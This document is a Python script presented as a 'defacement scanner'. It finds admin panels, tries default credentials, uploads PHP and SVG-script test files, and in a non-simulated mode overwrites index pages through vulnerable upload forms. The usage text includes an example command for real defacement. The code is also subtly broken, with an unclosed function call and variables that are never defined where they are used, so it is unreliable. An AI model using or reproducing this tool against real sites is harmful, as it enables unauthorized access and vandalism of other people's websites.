#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import os
import time
import random
import json
from datetime import datetime
import sys
import re
import threading
from queue import Queue

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

class DefacementScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        self.vulnerabilities = []
        self.uploaded_files = []
        self.discovered_urls = set()
        self.crawl_queue = Queue()
        self.threads = []
        self.stop_flag = False
        self.defacement_success = False
        
        # CMS detection patterns
        self.cms_patterns = {
            'WordPress': ['wp-content', 'wp-includes', '/wp-admin/'],
            'Joomla': ['/joomla/', 'com_joomla', 'Joomla!'],
            'Drupal': ['/sites/all/', 'drupal.js', 'Drupal.settings']
        }
        
        # Admin paths
        self.admin_paths = [
            'admin', 'wp-admin', 'administrator', 'backend',
            'manager', 'panel', 'adminpanel', 'admincp'
        ]
        
        # File upload testing
        self.test_content = "ZERODEFACE_SECURITY_TEST_"
        self.test_patterns = [
            "DEFACED_BY_", "HACKED_BY", "SECURITY_TEST",
            "VULNERABLE_TO_UPLOAD", "TEST_ID:", "ZERODEFACE"
        ]
        
        # Default credentials
        self.default_credentials = {
            'generic': [('admin', 'admin'), ('admin', 'password')],
            'WordPress': [('admin', 'admin'), ('wpadmin', 'wpadmin')],
            'Joomla': [('admin', 'admin'), ('superuser', 'superuser')],
            'Drupal': [('admin', 'admin'), ('drupal', 'drupal')]
        }
        
        # Defacement content
        self.defacement_content = """<!DOCTYPE html>
<html>
<head>
    <title>Security Test Defacement</title>
    <style>
        body { background: #000; color: #fff; text-align: center; padding: 50px; font-family: Arial, sans-serif; }
        h1 { color: #f00; }
        footer { margin-top: 50px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <h1>SECURITY TEST ONLY</h1>
    <p>This is a simulated defacement for security testing purposes</p>
    <p>Vulnerability: Unprotected File Upload</p>
    <footer>Test ID: ZD-{RANDOM_ID} | {TIMESTAMP}</footer>
</body>
</html>"""
        self.defacement_paths = ['index.html', 'index.php', 'default.html']

    def print_banner(self):
        banner = r"""
__________                 ________          _____                     
\____    /___________  ____\______ \   _____/ ____\____    ____  ____  
  /     // __ \_  __ \/  _ \|    |  \_/ __ \   __\\__  \ _/ ___\/ __ \ 
 /     /\  ___/|  | \(  <_> )    `   \  ___/|  |   / __ \\  \__\  ___/ 
/_______ \___  >__|   \____/_______  /\___  >__|  (____  /\___  >___  >
        \/   \/                    \/     \/           \/     \/    \/ 
        """
        print("\033[1;31m" + banner + "\033[0m")
        print("\033[1;37mZeroDeface Ultimate v3.1 - Defacement Scanner\033[0m")
        print("\033[1;33mNow with Safe Defacement Simulation | Full CMS Coverage | Ethical Mode\033[0m\n")

    def rate_limit(self):
        """Enforce rate limiting"""
        elapsed = time.time() - self.last_request_time
        if elapsed < 0.5:  # 500ms between requests
            time.sleep(0.5 - elapsed)
        self.last_request_time = time.time()

    def log_vulnerability(self, category, description, exploit=None, proof=None):
        vuln = {
            'category': category,
            'description': description,
            'timestamp': datetime.now().isoformat(),
            'exploit': exploit,
            'proof': proof
        }
        self.vulnerabilities.append(vuln)
        print(f"\033[1;31m[!] {category} found:\033[0m {description}")

    def crawl_for_forms(self):
        """Find all forms on a page"""
        try:
            self.rate_limit()
            response = self.session.get(self.target_url, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[-] Error crawling for forms: {e}")
            return []

    def scan_admin_panels(self):
        """Scan for admin panels"""
        print("[*] Scanning for admin panels...")
        found = False
        
        for path in self.admin_paths:
            admin_url = urljoin(self.target_url, path)
            try:
                self.rate_limit()
                response = self.session.get(admin_url, verify=False, timeout=15)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if soup.find('input', {'type': 'password'}) or 'login' in response.text.lower():
                        self.log_vulnerability(
                            "Admin Panel Found",
                            f"Admin interface at {admin_url}",
                            exploit=f"Visit {admin_url}",
                            proof=response.text[:200] + "..."
                        )
                        found = True
                        
                        if self.test_default_credentials(admin_url):
                            return True
                            
            except Exception as e:
                if not args.quiet:
                    print(f"[-] Error checking {admin_url}: {str(e)[:50]}...")
        
        return found

    def test_default_credentials(self, login_url):
        """Test default credentials"""
        print(f"[*] Testing default credentials at {login_url}")
        credentials = self.default_credentials['generic']
        
        for username, password in credentials:
            try:
                data = {'username': username, 'password': password, 'login': 'submit'}
                self.rate_limit()
                response = self.session.post(login_url, data=data, verify=False, timeout=15)
                
                if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                    self.log_vulnerability(
                        "Default Credentials",
                        f"Working credentials: {username}/{password}",
                        exploit=f"curl -X POST -d 'username={username}&password={password}' {login_url}",
                        proof=f"Logged in successfully to {login_url}"
                    )
                    return True
                    
            except Exception as e:
                continue
                
        return False

    def scan_upload_vulnerabilities(self):
        """Scan for file upload vulnerabilities"""
        print("[*] Scanning for file upload vulnerabilities...")
        found = False
        
        forms = self.crawl_for_forms()
        for form in forms:
            if form.find('input', {'type': 'file'}):
                action = form.get('action', '') or self.target_url
                method = form.get('method', 'post').lower()
                
                if self.test_file_upload(form, action, method):
                    found = True
                    if args.deface:
                        self.auto_deface(action)
        
        # Check common upload paths
        common_upload_paths = ['upload', 'file-upload', 'upload-file', 'admin/upload']
        for path in common_upload_paths:
            upload_url = urljoin(self.target_url, path)
            try:
                self.rate_limit()
                response = self.session.get(upload_url, verify=False, timeout=10)
                if response.status_code == 200 and 'upload' in response.text.lower():
                    if self.test_upload_endpoint(upload_url):
                        found = True
                        if args.deface:
                            self.auto_deface(upload_url)
            except:
                continue
                
        return found

    def test_file_upload(self, form, action_url, method='post'):
        """Test file upload vulnerability"""
        test_files = [
            ('test.html', 'text/html', f'<html><body>{self.test_content}</body></html>'),
            ('test.php', 'application/x-php', '<?php echo "UPLOAD_TEST"; ?>'),
            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS")</script></svg>')
        ]
        
        for filename, content_type, content in test_files:
            try:
                files = {'file': (filename, content, content_type)}
                self.rate_limit()
                if method == 'post':
                    response = self.session.post(action_url, files=files, verify=False, timeout=15)
                else:
                    response = self.session.request(method, action_url, files=files, verify=False, timeout=15)
                
                if response.status_code in [200, 201, 302]:
                    file_url = urljoin(action_url, filename)
                    self.rate_limit()
                    file_response = self.session.get(file_url, verify=False, timeout=10)
                    
                    if file_response.status_code == 200 and self.test_content in file_response.text:
                        self.log_vulnerability(
                            "File Upload Vulnerability",
                            f"File upload possible at {action_url} - {filename} accessible at {file_url}",
                            exploit=f"curl -F 'file=@{filename}' {action_url}",
                            proof=file_response.text[:500] + "..."
                        )
                        self.uploaded_files.append(file_url)
                        return True
                        
            except Exception as e:
                if args.verbose:
                    print(f"[-] Upload test failed for {filename}: {str(e)[:50]}...")
                
        return False

    def test_upload_endpoint(self, upload_url):
        """Test direct upload endpoint"""
        return self.test_file_upload(None, upload_url)

    def auto_deface(self, upload_url):
        """Automated defacement simulation"""
        if not args.simulate:
            print("\033[1;31m[!] WARNING: REAL DEFACEMENT MODE ENABLED\033[0m")
        
        print("[*] Attempting defacement simulation...")
        
        for filename in self.defacement_paths:
            content = self.defacement_content.replace(
                "{RANDOM_ID}", str(random.randint(10000,99999))
            content = content.replace(
                "{TIMESTAMP}", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            
            try:
                if args.simulate:
                    print(f"[SIMULATION] Would upload defacement page as {filename} to {upload_url}")
                    self.defacement_success = True
                    return True
                
                # Real defacement attempt
                files = {'file': (filename, content, 'text/html')}
                self.rate_limit()
                response = self.session.post(upload_url, files=files, timeout=15)
                
                if response.status_code in [200, 201, 302]:
                    deface_url = urljoin(upload_url, filename)
                    self.rate_limit()
                    check = self.session.get(deface_url, timeout=10)
                    if check.status_code == 200:
                        self.log_vulnerability(
                            "Defacement Successful",
                            f"Deployed defacement page to {deface_url}",
                            exploit=f"curl -F 'file=@{filename}' {upload_url}",
                            proof=check.text[:200] + "..."
                        )
                        self.defacement_success = True
                        self.uploaded_files.append(deface_url)
                        return True
            except Exception as e:
                print(f"[-] Defacement attempt failed for {filename}: {e}")
        
        return False

    def generate_report(self, filename):
        """Generate JSON report"""
        report = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'uploaded_files': self.uploaded_files,
            'defacement_success': self.defacement_success
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Report saved to {filename}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def cleanup(self):
        """Clean up test files"""
        print("[*] Cleaning up test files...")
        for file_url in self.uploaded_files:
            try:
                self.rate_limit()
                self.session.delete(file_url, verify=False, timeout=10)
                print(f"[*] Cleaned up test file at {file_url}")
            except:
                print(f"[-] Failed to clean up test file at {file_url}")
        self.session.close()

def main():
    parser = argparse.ArgumentParser(
        description='ZeroDeface Ultimate v3.1 - Website Defacement Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""\033[1;34m
Examples:
  Scan only:       python deface_scanner.py --url http://example.com --all
  Deface sim:      python deface_scanner.py --url http://example.com --upload --deface --simulate
  Real defacement: python deface_scanner.py --url http://example.com --upload --deface
\033[0m"""
    )
    
    parser.add_argument('--url', required=True, help='Target URL to scan')
    parser.add_argument('--admin', action='store_true', help='Scan for admin panels')
    parser.add_argument('--upload', action='store_true', help='Test file upload vulnerabilities')
    parser.add_argument('--deface', action='store_true', help='Attempt defacement if upload is vulnerable')
    parser.add_argument('--simulate', action='store_true', help='Safe simulation mode (no real changes)')
    parser.add_argument('--all', action='store_true', help='Run all scans')
    parser.add_argument('--report', help='Save results to JSON file')
    parser.add_argument('--verbose', action='store_true', help='Show detailed output')
    parser.add_argument('--quiet', action='store_true', help='Show only critical findings')
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    try:
        scanner = DefacementScanner(args.url)
        scanner.print_banner()
        
        if args.all or args.admin:
            scanner.scan_admin_panels()
            
        if args.all or args.upload:
            scanner.scan_upload_vulnerabilities()
            
        if args.report:
            scanner.generate_report(args.report)
            
        if not scanner.vulnerabilities:
            print("\033[1;32m[+] No vulnerabilities found.\033[0m")
            
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
    except Exception as e:
        print(f"\033[1;31m[-] Error: {e}\033[0m")
    finally:
        if 'scanner' in locals():
            scanner.cleanup()

if __name__ == '__main__':
    main()
